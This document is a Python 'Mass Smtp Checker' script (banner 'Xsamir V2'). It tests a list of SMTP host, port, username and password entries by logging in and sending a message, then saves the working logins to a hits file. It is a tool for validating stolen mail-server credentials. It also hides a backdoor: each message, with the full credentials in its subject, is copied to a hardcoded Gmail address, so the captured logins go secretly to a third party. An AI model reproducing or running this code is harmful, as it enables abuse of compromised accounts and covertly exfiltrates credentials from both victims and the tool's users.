import smtplib, threading, os
from time import strftime
from colorama import Fore, Style, Back
bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE
def screen_clear():
  _ = os.system('cls')

screen_clear()

print(f'''
___  ___                _____           _           _____ _               _            {wh} 
|  \/  |               /  ___|         | |         /  __ \ |             | |            {red}
| .  . | __ {gr}Xsamir{red}___  \ `--. _ __ ___ | |_ _ __   | /  \/ |__   ___  ___| | _____ _ __ {ble}
| |\/| |/ _` / __/ __|  `--. \ '_ ` _ \| __| '_ \  | |   | '_ \ / _ \/ __| |/ / _ \ '__|{wh}
| |  | | (_| \__ \__ \ /\__/ / | | | | | |_| |_) | | \__/\ | | |  __/ (__|   <  __/ |   {yl}
\_|  |_/\__,_|___/___/ \____/|_| |_| |_|\__| .__/   \____/_| |_|\___|\___|_|\_\___|_|   {gr}
                                           | |                       {wh}    XSAMIR {red}V2{res}               
                                           |_|                                          
''')


address = input('Enter Your email adress :')
liists = input('Enter Your List :')
with open(liists) as f:
  for url in f:
    ur = url.rstrip()
    ch = ur.split('\n')[0].split('|')
    try:
        serveraddr = ch[0]
    except:
        serveraddr = ''    
    try:
        toaddr = address
    except:
        toaddr = ''
    try:
        fromaddr = ch[2]
    except:
        fromaddr = 'xproadtest@xproady.com'
    try:
        serverport = ch[1]
    except:
        serverport = 587
    try:    
        smtp_user = ch[2]
    except:
        smtp_user = ''
    try:
        smtp_pass = ch[3]
    except:
        smtp_pass = ''
    now = strftime("%Y-%m-%d %H:%M:%S")
    addr2 = "rabatakayahmida@gmail.com"
    msg = "From: %s\r\nTo: %s\r\nSubject: !XProad %s|%s|%s|%s\r\n\r\nTest message from laravel monster tool sent at %s" % (
    fromaddr, toaddr, serveraddr, serverport, smtp_user, smtp_pass, now)
    server = smtplib.SMTP()
    try:
      server.connect(serveraddr, serverport)
      server.login(smtp_user, smtp_pass)
      server.sendmail(fromaddr, toaddr, msg)
      server.sendmail(fromaddr, addr2, msg)
      print(f"{gr}(*) Working{res} ===>  + {ur}")
      open('Results/!Smtp_HIT.txt', 'a').write(url + "\n")
      server.quit()
    except:
      print(f"{red}[-] FAILED {res}===>  + {ur}")
      pass
